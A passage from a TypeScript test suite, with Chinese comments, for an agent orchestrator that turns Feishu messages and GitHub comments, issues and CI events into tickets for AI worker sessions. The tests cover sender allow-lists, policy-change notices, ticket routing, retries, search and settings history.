  expect(runtime.store.tickets.get(ticket.id)!.ended).toBeDefined()
  await expect(route({ kind: 'attach', ticket_id: ticket.id, trigger_id: guest.id })).rejects.toThrow('stopped')
  // 自行结束的工单会在其线程上有人发消息时恢复，无论发送者是谁。
  const other = await acceptedTicket(feishu('20', '@bot 修另一个'))
  await runTool(other.sessionId, 'orchestrator_report', { state: 'dropped', summary: 'not reproduced' })
  expect(runtime.store.tickets.get(other.ticket.id)!.ended).toBeDefined()
  await receive(feishu('21', '我这边还能复现', { mentions: [], root_id: 'om_20', sender_id: 'ou_guest' }))
  await runtime.pump()
  const resumed = runtime.store.tickets.get(other.ticket.id)!
  expect(resumed.ended).toBeUndefined()
  expect(resumed.assignments).toHaveLength(2)
  expect(resumed.inputs.map(input => input.kind)).toContain('resumed')
})

it('tells live workers about policy changes instead of revoking them and restarts in-flight assessments', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  const pending = feishu('8', '新观察', { mentions: [], sender_id: MEMBER, root_id: undefined })
  await receive(pending)
  expect(runtime.store.threads.get(`feishu:${CHAT}:om_8`)?.evaluating).toBeDefined()
  deliveries.mockClear()
  const settings = runtime.store.settings()
  const result = await runtime.settings.save('policy', { ...settings.policy, rules: settings.policy.rules.map(rule => ({ ...rule, enabled: rule.id === 'copy' })) }, runtime.store.blockRevision('policy'), 'panel')
  await runtime.idle()
  expect(result).toMatchObject({ saved: true, policy_changed: true })
  // 规则变了，但并未影响这个明确工单（其请求者仍在名单中）：worker 不会被唤醒。
  expect(runtime.store.tickets.get(ticket.id)!.inputs).toEqual([])
  expect(relays(sessionId)).toEqual([])
  // 其请求者被移出允许名单：worker 会收到内联告知，工单继续。
  const current = runtime.store.settings().policy
  await runtime.settings.save('policy', { ...current, sources: { ...current.sources, feishu: { ...current.sources.feishu!, allowed: [] } } },
    runtime.store.blockRevision('policy'), 'panel')
  await runtime.idle()
  expect(runtime.store.tickets.get(ticket.id)!.inputs).toEqual([expect.objectContaining({ kind: 'policy-changed',
    effect: { requesterAllowed: false, requester: { source: 'feishu', id: MEMBER } } })])
  expect(runtime.store.tickets.get(ticket.id)!.ended).toBeUndefined()
  expect(relays(sessionId)).toEqual([{ text: expect.stringContaining('may no longer start work') }])
  expect(runtime.store.decisions.byThread(`feishu:${CHAT}:om_8`)[0]).toMatchObject({ kind: 'unavailable', reason: [{ code: 'policyChanged' }] })
  expect(relays(runtime.masterId).filter(item => item.kind === 'candidate' && item.trigger_id === pending.id)).toHaveLength(1)
})

it('attaches an event to an existing open task through orchestrator_route', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  const other = feishu('9', '@bot 顺手把这里也改了', { root_id: undefined })
  await receive(other)
  deliveries.mockClear()
  expect(await route({ kind: 'attach', ticket_id: ticket.id, trigger_id: other.id, note: '同一个页面' })).toMatchObject({ ticket: { ticket_id: ticket.id } })
  expect(runtime.store.threads.get(`feishu:${CHAT}:om_9`)?.subscriptions).toEqual([ticket.id])
  expect(runtime.store.decisions.byThread(`feishu:${CHAT}:om_9`)).toEqual([expect.objectContaining({ kind: 'ignore', reason: [{ code: 'routed', values: { ticket: ticket.id } }] })])
  expect(relays(sessionId)[0]).toMatchObject({ trigger_id: other.id, text: '@bot 顺手把这里也改了', routing_note: '同一个页面' })
})

it('acknowledges a follow-up from the worker once and rejects events outside the task', async () => {
  const { sessionId, ticket } = await acceptedTicket()
  const followup = feishu('10', '还有这个', { mentions: [], root_id: 'om_1' })
  await receive(followup)
  expect(await runTool(sessionId, 'orchestrator_ack', { trigger_id: followup.id, text: '收到，也处理这个。' })).toMatchObject({ acknowledgement: 'sent', reused: false })
  expect(await runTool(sessionId, 'orchestrator_ack', { trigger_id: followup.id, text: '不同措辞' })).toMatchObject({ reused: true })
  const stranger = feishu('11', '无关', { mentions: [], root_id: undefined })
  await receive(stranger)
  await expect(runTool(sessionId, 'orchestrator_ack', { trigger_id: stranger.id, text: 'x' })).rejects.toThrow('does not belong')
  expect(runtime.store.tickets.get(ticket.id)!.inputs.map(input => input.kind)).toEqual(['trigger'])
})

it('treats GitHub comments through the same gate: mentions by members are explicit, others need an existing task', async () => {
  const stranger = commentTrigger('github', { id: 1, body: 'looks wrong', user: { login: 'someone' }, html_url: 'https://github.com/acme/widgets/pull/7#issuecomment-1', created_at: '2026-09-09T00:00:00Z' }, { number: 7, isPr: true }, 'conversation', 'agent-bot')
  await receive(stranger)
  expect(runtime.store.decisions.byThread('github:7')).toEqual([expect.objectContaining({ kind: 'ignore', reason: [expect.objectContaining({ code: 'not_a_member' })] })])
  const mention = commentTrigger('github', { id: 2, body: '@agent-bot please fix', user: { login: 'alice' }, html_url: 'https://github.com/acme/widgets/pull/7#issuecomment-2', created_at: '2026-09-09T00:01:00Z' }, { number: 7, isPr: true }, 'conversation', 'agent-bot')
  await receive(mention)
  expect(relays(runtime.masterId).at(-1)).toMatchObject({ kind: 'candidate', strength: 'explicit', trigger_id: mention.id })
  const result = await route({ kind: 'accept', trigger_id: mention.id, title: 'Fix PR 7', worktree_name: 'fix-pr', acknowledgement: 'On it: fixing the review finding.' })
  const ticket = runtime.store.tickets.get((result.ticket as { ticket_id: string }).ticket_id)!
  expect(ticket.channels).toEqual([expect.objectContaining({ source: 'github', address: expect.objectContaining({ number: '7' }) })])
  // PR 的 head 是工单执行环境中的变量；prepare 命令可以获取它。
  expect(Object.fromEntries(runtime.ticketEnvironment(ticket).map(variable => [variable.key, variable.value]))).toMatchObject({ DSH_SUPERAGENT_SOURCE: 'github', DSH_SUPERAGENT_GITHUB_NUMBER: '7', DSH_SUPERAGENT_GITHUB_PR_HEAD: 'refs/pull/7/head' })
  const ci = { ...stranger, id: 'ci-1', human: false, text: 'GitHub PR #7 CI: failing', meta: { ci: true } }
  await receive(ci)
  expect(runtime.store.tickets.get(ticket.id)!.inputs).toEqual([expect.objectContaining({ triggerId: 'ci-1' })])
})

it('relays an allowed sender\'s mention in a new Issue as an explicit candidate from the poll that reads its notification', async () => {
  const issue = { id: 1012, number: 12, title: 'Login fails', body: '@agent-bot please fix the login', state: 'open',
    created_at: '2026-09-09T00:00:00Z', html_url: 'https://github.com/acme/widgets/issues/12', user: { login: 'alice', type: 'User' } }
  const notification = { id: 'n1', updated_at: issue.created_at, reason: 'mention', repository: { full_name: 'acme/widgets' },
    subject: { url: 'https://api.github.com/repos/acme/widgets/issues/12', type: 'Issue', title: issue.title } }
  vi.spyOn(Commands.prototype, 'run').mockResolvedValue(`HTTP/2.0 200 OK\r\nX-Poll-Interval: 60\r\n\r\n${JSON.stringify([notification])}`)
  vi.spyOn(Commands.prototype, 'gh').mockResolvedValue(issue)
  vi.spyOn(Commands.prototype, 'pages').mockResolvedValue([])
  runtime.store.set('github-since:github', '2026-09-08T23:59:00.000Z')
  await pollRound(runtime.context(githubKind, 'github'))
  await runtime.idle()
  const candidate = relays(runtime.masterId).at(-1)
  expect(candidate).toMatchObject({ kind: 'candidate', strength: 'explicit', trigger_id: key('github-issue', '12'), thread: 'github:12' })
})

it('ignores an allowed sender\'s new Issue that does not mention the agent, and an unlisted sender\'s mention, from the poll that reads them', async () => {
  const poll = async (number: number, body: string, login: string) => {
    const issue = { id: 1000 + number, number, title: 'Login fails', body, state: 'open', created_at: '2026-09-09T00:00:00Z', html_url: `https://github.com/acme/widgets/issues/${number}`, user: { login, type: 'User' } }
    const notification = { id: `n${number}`, updated_at: issue.created_at, reason: 'subscribed', repository: { full_name: 'acme/widgets' },
      subject: { url: `https://api.github.com/repos/acme/widgets/issues/${number}`, type: 'Issue', title: issue.title } }
    vi.spyOn(Commands.prototype, 'run').mockResolvedValue(`HTTP/2.0 200 OK\r\nX-Poll-Interval: 60\r\n\r\n${JSON.stringify([notification])}`)
    vi.spyOn(Commands.prototype, 'gh').mockResolvedValue(issue)
    vi.spyOn(Commands.prototype, 'pages').mockResolvedValue([])
    runtime.store.set('github-since:github', '2026-09-08T23:59:00.000Z')
    await pollRound(runtime.context(githubKind, 'github'))
    await runtime.idle()
  await runtime.idle()
    return key('github-issue', String(number))
  }
  const quiet = await poll(12, 'The login page fails after the update', 'alice')
  expect(runtime.store.decisions.byThread('github:12')).toEqual([expect.objectContaining({ kind: 'ignore', reason: [{ code: 'no_mention', triggerId: quiet }] })])
  const stranger = await poll(13, '@agent-bot please fix the login', 'mallory')
  expect(runtime.store.decisions.byThread('github:13')).toEqual([expect.objectContaining({ kind: 'ignore', reason: [{ code: 'not_a_member', triggerId: stranger }] })])
  expect(relays(runtime.masterId).filter(item => item.kind === 'candidate')).toEqual([])
})

it('keeps Issue Triggers stored before Issues arrived through notifications readable on their Thread', async () => {
  const stored: Trigger = { id: key('github-issue', '5'), source: 'github-issue', threads: [{ source: 'github', id: '5' }],
    actor: { source: 'github', id: 'alice' }, human: true, at: '2026-09-01T00:00:00Z', text: 'Bug\n\ndetails',
    url: 'https://github.com/acme/widgets/issues/5', meta: { number: 5, isPr: false, eligibleAt: '2026-09-02T00:00:00.000Z' } }
  runtime.store.triggers.save(stored)
  runtime.store.threads.save({ key: 'github:5', ref: { source: 'github', id: '5' }, createdAt: stored.at, subscriptions: [], correlated: [],
    pending: [], meta: {} })
  const read = await runTool(runtime.masterId, 'orchestrator_read', { resource: `trigger/${stored.id}` })
  expect(read).toMatchObject({ trigger_id: stored.id, source: 'github-issue', text: 'Bug\n\ndetails' })
  const thread = (await api('GET', 'threads/github:5')).body
  expect(thread).toMatchObject({ timeline: [expect.objectContaining({ id: stored.id, source: 'github-issue' })] })
})

it('relaunches running assignments after a restart with a recovery note', async () => {
  const { ticket } = await acceptedTicket()
  runtime.executor.resume()
  const recovered = runtime.store.tickets.get(ticket.id)!
  expect(recovered.assignments.map(item => item.state)).toEqual(['ended', 'pending'])
  expect(recovered.inputs).toEqual([expect.objectContaining({ kind: 'text', text: expect.stringContaining('host restarted') })])
  deliveries.mockClear()
  await runtime.pump()
  await runtime.idle()
  expect(runtime.store.tickets.get(ticket.id)!.assignments[1]).toMatchObject({ state: 'running' })
  // 新派工的消息只说明新增内容，因为会话已保存第一条；启动自身的轮次会按所读取的内容投递
  // 恢复说明。
  expect(relays(`worker-${ticket.id}`)).toEqual([{ ticket_id: ticket.id, assignment: 2 }, { text: expect.stringContaining('host restarted') }])
})

it('projects read models for the management page and removes thread subscriptions from the Web surface', async () => {
  const { ticket, trigger } = await acceptedTicket()
  const threadKeyValue = `feishu:${CHAT}:om_1`
  expect(overviewOf(runtime)).toMatchObject({ person: [], executor: { queued: 0, maxWorkers: 3, idle: 0 }, flow: { received: 0, accepted: 0, judged: 0 } })
  expect(ticketList(viewsOf(runtime), 'working', 0, 20).items).toEqual([expect.objectContaining({ id: ticket.id, stage: 'working' })])
  expect(ticketList(viewsOf(runtime), 'open', 0, 20).items).toEqual([expect.objectContaining({ id: ticket.id, stage: 'working', sessionId: `worker-${ticket.id}`, strength: 'explicit' })])
  expect(ticketDetail(viewsOf(runtime), ticket.id)).toMatchObject({ mandate: { strength: 'explicit' }, decision: { kind: 'accept' }, threads: [expect.objectContaining({ key: threadKeyValue, title: '@bot 修一下回归' })], channels: [expect.objectContaining({ source: 'feishu' })] })
  const follow = feishu('20', '补充：日志在这里', { mentions: [], root_id: 'om_1', sender_id: 'ou_guest' })
  await receive(follow)
  expect(threadList(viewsOf(runtime), 'subscribed', 0, 20).items).toEqual([expect.objectContaining({ key: threadKeyValue, lastAt: follow.at, tickets: [{ id: ticket.id, title: '修复回归', state: 'open' }] })])
  const detail = threadDetail(viewsOf(runtime), threadKeyValue, undefined, 50)!
  expect(detail.timeline.map(item => item.id)).toEqual([trigger.id, follow.id])
  expect(detail.timeline[0]!.disposition).toMatchObject({ decision: { outcome: 'accept', ticketId: ticket.id } })
  expect(detail.timeline[1]!.disposition).toMatchObject({ fanout: [ticket.id] })
  expect(search(viewsOf(runtime), '日志在这里', new TextCache(0)).items).toEqual([expect.objectContaining({ id: follow.id, threads: [threadKeyValue], threadTitle: '@bot 修一下回归' })])
  expect(decisionList(viewsOf(runtime), ['accept'], 0, 10)).toEqual({ items: [expect.objectContaining({ kind: 'accept', ticketId: ticket.id, threadTitle: '@bot 修一下回归' })], next_offset: null })
  const thread = runtime.store.threads.get(threadKeyValue)!
  runtime.store.threads.describe(thread.key, { label: 'Named by its source' })
  expect(threadList(viewsOf(runtime), 'all', 0, 20).items[0]).toMatchObject({ title: 'Named by its source' })
  expect((await api('GET', 'state')).body).not.toHaveProperty('tickets')
  // scripts/dsh-superagent 和 agents 从 GET state 读取健康状态（docs/006，管理 API）；设置及其修订版本有自己的路由。
  expect((await api('GET', 'state')).body).toMatchObject({ health: { runtime: { state: expect.any(String) } }, paused: false, load: { maxWorkers: 3 } })
  expect((await api('GET', 'settings')).body).toMatchObject({ sources: expect.arrayContaining([expect.objectContaining({ id: 'github',
    revision: expect.any(Number), value: expect.objectContaining({ enabled: true }) })]), blocks: { policy: { revision: expect.any(Number) } } })
  expect((await api('POST', `threads/${encodeURIComponent(threadKeyValue)}/unsubscribe`)).body).toMatchObject({ removed: true })
  expect(threadList(viewsOf(runtime), 'subscribed', 0, 20).items).toEqual([])
  expect(agents.get(runtime.masterId)!.inject).toHaveBeenCalled()
})

it('lets an Executor drop only its own ticket from a thread it finds unrelated, but not the thread it started on or its pull request\'s', async () => {
  const { ticket, trigger, sessionId } = await acceptedTicket()
  const other = await acceptedTicket(feishu('5', '@bot 另一件事'))
  // 一个已附加的线程，后来发现是关于另一件事的，另一个工单也跟随它。
  const attached = { source: 'feishu', id: 'oc_side:om_side' }
  subscribe(ticket.id, attached); subscribe(other.ticket.id, attached)
  const inject = agents.get(runtime.masterId)!.inject
  vi.mocked(inject).mockClear()
  expect(await runTool(sessionId, 'orchestrator_thread_unrelated', { thread: 'feishu:oc_side:om_side', reason: 'It discusses the login page, not this regression.' })).toEqual({ removed: true, thread: 'feishu:oc_side:om_side' })
  expect(runtime.store.threads.get('feishu:oc_side:om_side')!.subscriptions).toEqual([other.ticket.id])
  await vi.waitFor(() => expect(JSON.stringify(vi.mocked(inject).mock.calls)).toContain('thread_unrelated'))
  await expect(runTool(sessionId, 'orchestrator_thread_unrelated', { thread: 'feishu:oc_side:om_side', reason: 'again' })).rejects.toThrow('does not follow that thread')
  await expect(runTool(sessionId, 'orchestrator_thread_unrelated', { thread: threadKey(trigger.threads[0]!), reason: 'no' })).rejects.toThrow('the ticket started on')
  runtime.engine.bindThread(ticket.id, { source: 'github', id: '7' }, true)
  await expect(runTool(sessionId, 'orchestrator_thread_unrelated', { thread: 'github:7', reason: 'no' })).rejects.toThrow('pull request')
  // worker 只会丢弃自己的工单：另一个工单的线程不是此工单跟随的线程。
  await expect(runTool(sessionId, 'orchestrator_thread_unrelated', { thread: threadKey(other.trigger.threads[0]!), reason: 'no' })).rejects.toThrow('does not follow that thread')
})

it('reports a Source that was switched on as starting until its next pass reports its health', async () => {
  const save = (enabled: boolean) => runtime.settings.save('source:github', { enabled, config: runtime.store.settings().sources.github!.config }, runtime.store.blockRevision('source:github'), 'panel')
  const github = async () => ((await api('GET', 'sources')).body as { id: string; health: unknown[] }[]).find(source => source.id === 'github')!.health
  await save(false)
  runtime.context(githubKind, 'github').report('github', { state: 'paused', detail: 'Off', code: 'sourceOff' })
  await save(true)
  expect(await github()).toEqual([{ name: 'github', state: 'starting', detail: '' }])
  // 报告其他内容的部件（例如缺失的 CLI）会保留其报告：不会有轮次来替换它。
  await save(false)
  runtime.context(githubKind, 'github').report('github', { state: 'paused', detail: 'x', code: 'feishuCliUnset' })
  await save(true)
  expect(await github()).toEqual([expect.objectContaining({ code: 'feishuCliUnset' })])
})

it('records each settings save with its policy change and the open tickets told about it', async () => {
  const { ticket } = await acceptedTicket()
  const settings = runtime.store.settings()
  await runtime.settings.save('executor', { ...settings.executor, maxWorkers: 5 }, runtime.store.blockRevision('executor'), 'panel')
  // 来源接收什么由它自己的配置决定，而不是策略；在那里谁可以发起工作由策略决定。
  const feishu = runtime.sources.instance('feishu')!
  await runtime.settings.save('source:feishu', { enabled: true, config: { ...feishu.config, directMessages: false } }, runtime.store.blockRevision('source:feishu'), 'panel')
  const policy = runtime.store.settings().policy
  await runtime.settings.save('policy', { ...policy, sources: { ...policy.sources, feishu: { ...policy.sources.feishu!, allowed: [...policy.sources.feishu!.allowed, { id: 'ou_bob', name: 'Bob' }] } } }, runtime.store.blockRevision('policy'), 'panel')
  await expect(runtime.settings.save('executor', settings.executor, 0, 'panel')).rejects.toThrow('Settings changed')
  const history = policyHistory(runtime.store, runtime.sources, policyVersion(runtime.store.settings()))
  expect(history.items.slice(0, 3)).toEqual([
    // 名单上的另一位发送者不影响任何未结束工单，因此不会告知任何人。
    expect.objectContaining({ source: 'panel', block: 'policy', policyChanged: true, notified: [], changes: [expect.objectContaining({ source: 'feishu', field: 'allowed', part: true })] }),
    expect.objectContaining({ source: 'panel', block: 'source:feishu', policyChanged: false, notified: [], changes: [{ code: 'sourceField', source: 'feishu', field: 'directMessages', from: true, to: false }] }),
    expect.objectContaining({ source: 'panel', block: 'executor', policyChanged: false, notified: [], changes: [{ code: 'maxWorkers', from: 3, to: 5 }] }),
  ])
})

it('refuses an accept through orchestrator_route for inferred candidates so proactive work always goes through Eval', async () => {
  const observed = feishu('21', '这个文案好奇怪，改成“浏览网页”吧', { mentions: [] })
  await receive(observed)
  await expect(route({ kind: 'accept', trigger_id: observed.id, title: 'x', worktree_name: 'copy-fix', acknowledgement: 'x' })).rejects.toThrow('explicit requests from allowed senders')
  expect(runtime.store.tickets.list()).toEqual([])
})

it('syncs a Source\'s list once its plugin loads after dsh-superagent started', async () => {
  const next = await restart()
  await next.ready
  vi.mocked(Commands.prototype.lark).mockResolvedValue({ users: [{ member_id: MEMBER, name: 'Alice' }], has_more: false })
  next.sources.register(feishuKind)
  await vi.waitFor(() => expect(next.health['sync:feishu']).toMatchObject({ state: 'ready' }))
})

it('syncs the Feishu part of the Policy from its sync chat in place, and keeps the Policy version when only the order the chat lists changes', async () => {
  const policy = runtime.store.settings().policy
  await runtime.settings.save('policy', { ...policy, sources: { ...policy.sources, feishu: { allowed: [{ id: 'ou_bob', name: 'Bob' }, { id: MEMBER, name: 'Alice' }], syncChat: CHAT } } }, runtime.store.blockRevision('policy'), 'panel')
  vi.mocked(Commands.prototype.lark).mockResolvedValue({ users: [{ member_id: 'ou_erin', name: 'Erin' }, { member_id: MEMBER, name: 'Alice Liddell' }], has_more: false })
  expect(await runtime.settings.sync('feishu')).toEqual({ allowed: [{ id: MEMBER, name: 'Alice Liddell' }, { id: 'ou_erin', name: 'Erin' }], syncChat: CHAT, admission: {} })
  expect(runtime.store.settings().policy.sources.feishu!.allowed.map(entry => entry.id)).toEqual([MEMBER, 'ou_erin'])
  expect(runtime.health['sync:feishu']).toMatchObject({ state: 'ready', detail: '2 allowed' })
  const version = policyVersion(runtime.store.settings())
  vi.mocked(Commands.prototype.lark).mockResolvedValue({ users: [{ member_id: MEMBER, name: 'Alice Liddell' }, { member_id: 'ou_erin', name: 'Erin' }], has_more: false })
  await runtime.settings.sync('feishu')
  expect(policyVersion(runtime.store.settings())).toBe(version)
  await expect(runtime.settings.sync('github')).rejects.toThrow('nothing to sync from')
  vi.mocked(Commands.prototype.lark).mockRejectedValue(new Error('rate limited'))
  await expect(runtime.settings.sync('feishu')).rejects.toThrow('rate limited')
  expect(runtime.health['sync:feishu']).toMatchObject({ state: 'error', detail: expect.stringContaining('rate limited') })
})

it('describes rule edits in the Policy history and skips Policy syncs that change nothing', async () => {
  const settings = runtime.store.settings()
  const revision = () => runtime.store.get('settings-revision') as number
  const before = revision()
  // 同步群聊已恰好列出允许的用户，因此不会保存任何内容。
  await runtime.settings.sync('feishu')
  expect(revision()).toBe(before)
  await runtime.settings.save('policy', { ...runtime.store.settings().policy, rules: [{ ...settings.policy.rules[0]!, name: '文案' }, { ...settings.policy.rules[1]!, enabled: false }, { id: 'docs', name: '文档', enabled: true, instruction: 'x' }] }, runtime.store.blockRevision('policy'), 'panel')
  expect(policyHistory(runtime.store, runtime.sources, policyVersion(runtime.store.settings())).items[0]!.changes).toEqual([{ code: 'ruleRenamed', from: 'Copy fixes', to: '文案' }, { code: 'ruleDisabled', name: 'Visual fixes' }, { code: 'ruleAdded', name: '文档' }])
})

it('records an admission table change in the Policy history as one line for its Source, with a new Policy version', async () => {
  const policy = runtime.store.settings().policy
  const version = policyVersion(runtime.store.settings())
  await runtime.settings.save('policy', { ...policy, sources: { ...policy.sources, feishu: { ...policy.sources.feishu!, admission: { [CHAT]: { unlistedAddressed: 'explicit' } } } } }, runtime.store.blockRevision('policy'), 'panel')
  expect(policyVersion(runtime.store.settings())).not.toBe(version)
  expect(policyHistory(runtime.store, runtime.sources, policyVersion(runtime.store.settings())).items[0]!.changes).toEqual([{ code: 'sourceAdmission', source: 'feishu', part: true }])
})

it('retries only a failed, blocked or undelivered ticket with a new assignment, and finds tickets by title in search, and reports unavailable Evals as a problem', async () => {
  const { ticket } = await acceptedTicket()
  expect(() => runtime.engine.retryTicket(ticket.id)).toThrow(new UserError('notRetryable'))
  const current = runtime.store.tickets.get(ticket.id)!
  await runTool(`worker-${ticket.id}`, 'orchestrator_report', { state: 'failed', summary: 'LlmError: offline' })
  expect(waitsForPerson(runtime.store.tickets.get(ticket.id)!)).toBe(true)
  // 人可以在其会话中继续失败的 worker；只有已结束的工单才会锁定其工具。
  expect(guards.get(`worker-${ticket.id}`)!()).toBeUndefined()
  const retried = await runtime.engine.retryTicket(ticket.id)
  await runtime.idle()
  expect(waitsForPerson(runtime.store.tickets.get(ticket.id)!)).toBe(false)
  expect(runtime.store.tickets.get(ticket.id)!.assignments.map(item => item.state)).toEqual(['ended', 'running'])
  expect(retried.assignments.length).toBeGreaterThan(current.assignments.length)
  expect(retried.assignments.at(-2)!.endedReason).toBe('retried')
  // worker 的会话保存着派工，因此新的派工只说有人重试了它。
  expect(relays(`worker-${ticket.id}`).at(-1)).toEqual({ ticket_id: ticket.id, assignment: 2, note: expect.stringContaining('A person retried this ticket') })
  // 有人删除的会话会随下一个派工再次收到完整的首条消息。
  runtime.store.atomic(() => { runtime.engine.report(ticket.id, { state: 'failed', summary: 'LlmError: offline' }) })
  agents.delete(`worker-${ticket.id}`)
  runtime.engine.retryTicket(ticket.id)
  await runtime.idle()
  expect(relays(`worker-${ticket.id}`).at(-1)).toMatchObject({ ticket_id: ticket.id, title: '修复回归', trigger: expect.objectContaining({ text: '@bot 修一下回归' }) })
  expect(search(viewsOf(runtime), '修复', new TextCache(0)).tickets).toEqual([expect.objectContaining({ id: ticket.id })])
  expect(decisionList(viewsOf(runtime), [], 0, 10, '2999-01-01T00:00:00Z').items).toEqual([])
  const accepted = runtime.store.read.recentDecisions(0, 1)[0]!
  runtime.store.decisions.save({ ...accepted, id: 'unavailable-1', kind: 'unavailable', reason: [{ code: 'timeout' }], at: new Date().toISOString() })
  const unjudged = () => overviewOf(runtime).problems.filter(problem => problem.kind === 'eval-unavailable')
  expect(unjudged()).toEqual([expect.objectContaining({ thread: expect.objectContaining({ key: accepted.threadKey }), reason: [{ code: 'timeout' }], triggerId: accepted.triggerIds[0] })])
  // 健康状态会在一小时内将其显示为错误，`status` 会报告它，而概览上不会作为运行时错误显示。
  expect(evalsHealth(runtime.store)).toMatchObject({ state: 'error', detail: expect.stringContaining('Assessment timed out') })
  expect(evalsHealth(runtime.store, Date.now() + 3_700_000)).toMatchObject({ state: 'ready' })
  await runtime.pump()
  expect(runtime.health.evals).toMatchObject({ state: 'error' })
  expect(overviewOf(runtime).problems.filter(problem => problem.kind === 'runtime-error')).toEqual([])
  // 人的忽略会移除它，而不产生新的判断；只有不可用的评估才能被忽略。
  expect(await api('POST', `decisions/${accepted.id}/dismiss`)).toMatchObject({ status: 404, body: { error: 'Unavailable Eval not found', code: 'unknownProblem' } })
  expect(await api('POST', 'decisions/unavailable-1/dismiss')).toEqual({ status: 200, body: { dismissed: true } })
  expect(unjudged()).toEqual([])
  expect(evalsHealth(runtime.store)).toMatchObject({ state: 'ready' })
  expect(runtime.store.decisions.get('unavailable-1')).toMatchObject({ dismissed: true })
  runtime.store.decisions.save({ ...runtime.store.decisions.get('unavailable-1')!, dismissed: undefined })
  expect(unjudged()).toHaveLength(1)
  // 之后对同一线程的判断会解决它。
  runtime.store.decisions.save({ ...accepted, id: 'ignore-2', kind: 'ignore', reason: [said('context only')], at: new Date().toISOString() })
  expect(unjudged()).toEqual([])
})

it('links Channels and Threads for people, finds tickets by a bare PR number, and keeps ended subscriptions out of the default Thread filter', async () => {
  const { ticket } = await acceptedTicket(feishu('1', '@_user_1 修一下回归', { mentions: [{ id: 'ou_bot', key: '@_user_1', name: 'dsh-superagent' }] }))
  const home = `feishu:${CHAT}:om_1`
  expect(runtime.store.triggers.get(key('feishu', 'om_1'))!.text).toBe('@dsh-superagent 修一下回归')
  const chatLink = `https://applink.feishu.cn/client/chat/open?openChatId=${CHAT}`
  expect(ticketDetail(viewsOf(runtime), ticket.id)!.channels).toEqual([expect.objectContaining({ source: 'feishu', url: chatLink })])
  expect(threadDetail(viewsOf(runtime), home, undefined, 10)!.url).toBe(chatLink)
  // 工单打开的拉取请求是它作为自己追随的线程。
  runtime.store.tickets.save({ ...runtime.store.tickets.get(ticket.id)!, follows: [{ thread: 'github:4996', own: true }] })
  expect(search(viewsOf(runtime), '4996', new TextCache(0)).tickets).toEqual([expect.objectContaining({ id: ticket.id })])
  expect(threadList(viewsOf(runtime), 'subscribed', 0, 10).items.map(thread => thread.key)).toEqual([home])
  runtime.engine.stopTicket(ticket.id)
  expect(threadList(viewsOf(runtime), 'subscribed', 0, 10).items).toEqual([])
  expect(threadList(viewsOf(runtime), 'all', 0, 10).items.map(thread => thread.key)).toContain(home)
  await receive(feishu('9', '别的群的消息', { chat_id: 'oc_elsewhere' }))
  expect(search(viewsOf(runtime), '别的群', new TextCache(0)).items).toEqual([expect.objectContaining({ filtered: { code: 'chat_not_allowed' }, threadTitle: undefined })])
})

it('counts every step of the day\'s flow over the same arriving messages and lists the same accepted Decisions', async () => {
  const now = String(Date.now())
  await acceptedTicket(feishu('1', '@bot 修一下回归', { create_time: now }))
  await receive(feishu('7', '另一个群', { chat_id: 'oc_elsewhere', create_time: now }))
  const since = new Date(Date.now() - 86_400_000).toISOString()
  expect(overviewOf(runtime).flow).toMatchObject({ received: 2, filtered: 1, triggers: 1, judged: 1, accepted: 1 })
  expect(decisionList(viewsOf(runtime), ['accept', 'reopen'], 0, 10, since).items).toHaveLength(1)
  expect(decisionList(viewsOf(runtime), ['accept', 'reopen'], 0, 10, new Date(Date.now() + 60_000).toISOString()).items).toEqual([])
})

it('queues a requeued trigger visibly and tells the orchestrator', async () => {
  const stranger = commentTrigger('github', { id: 3, body: 'looks wrong', user: { login: 'someone' }, html_url: 'https://github.com/acme/widgets/pull/8#issuecomment-3', created_at: '2026-09-09T00:00:00Z' }, { number: 8, isPr: true }, 'conversation', 'agent-bot')
  await receive(stranger)
  runtime.store.saveSettings({ ...runtime.store.settings(), paused: true })
  expect(runtime.engine.reevaluate(stranger.id)).toBe(true)
  expect(threadDetail(viewsOf(runtime), 'github:8', undefined, 50)!.timeline[0]!.disposition).toMatchObject({ queued: true })
  await vi.waitFor(() => expect(agents.get(runtime.masterId)!.inject).toHaveBeenCalled())
})

it('asks a question where the human message that raised it was written, not in the ticket\'s original conversation', async () => {
  const { ticket, trigger, sessionId } = await acceptedTicket()
  subscribe(ticket.id, { source: 'github', id: '42' })
  const review = commentTrigger('github', { id: 5, body: 'Can you add the reason?', user: { login: 'alice' }, html_url: 'https://github.com/acme/widgets/pull/42#pullrequestreview-5', created_at: '2026-09-09T00:02:00Z' }, { number: 42, isPr: true }, 'review', 'agent-bot')
  await receive(review)
  await expect(runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'x', question_for_trigger_id: review.id })).rejects.toThrow('needs the question it raised')
  await expect(runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'x', human_action: 'Keep it?', question_for_trigger_id: 'unknown' })).rejects.toThrow('the person\'s message that raised it')
  await runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'no stop reason is recorded', human_action: 'Keep the PR and record the reason in a follow-up?', question_for_trigger_id: review.id })
  const queued = vi.spyOn(runtime.outbox, 'send')
  await runTool(runtime.masterId, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'attention', human_action: 'Keep the PR and record the reason in a follow-up?', text: 'Keep the PR and record the reason in a follow-up?' })
  expect(queued.mock.calls.at(-1)![0].channel).toEqual(review.channel)
  // 关于整个工单的问题仍会送到工单开始的地方。
  await runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'y', human_action: 'Desktop too?' })
  await runTool(runtime.masterId, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'attention', human_action: 'Desktop too?', text: '要不要也改桌面端？' })
  expect(queued.mock.calls.at(-1)![0].channel).toEqual(trigger.channel)
})

it('finds triggers by #PR number, GitHub link prefix and Feishu message id', async () => {
  const comment = commentTrigger('github', { id: 4, body: 'please check', user: { login: 'alice' }, html_url: 'https://github.com/acme/widgets/pull/9#issuecomment-4', created_at: '2026-09-09T00:00:00Z' }, { number: 9, isPr: true }, 'conversation', 'agent-bot')
  await receive(comment)
  expect(search(viewsOf(runtime), '#9', new TextCache(0)).threads).toEqual([expect.objectContaining({ key: 'github:9' })])
  expect(search(viewsOf(runtime), 'https://github.com/acme/widgets/pull/9', new TextCache(0)).items.map(item => item.id)).toContain(comment.id)
  const message = feishu('30', '随便说说', { mentions: [] })
  await receive(message)
  expect(search(viewsOf(runtime), 'https://x/y?id=om_30', new TextCache(0)).items.map(item => item.id)).toContain(message.id)
})

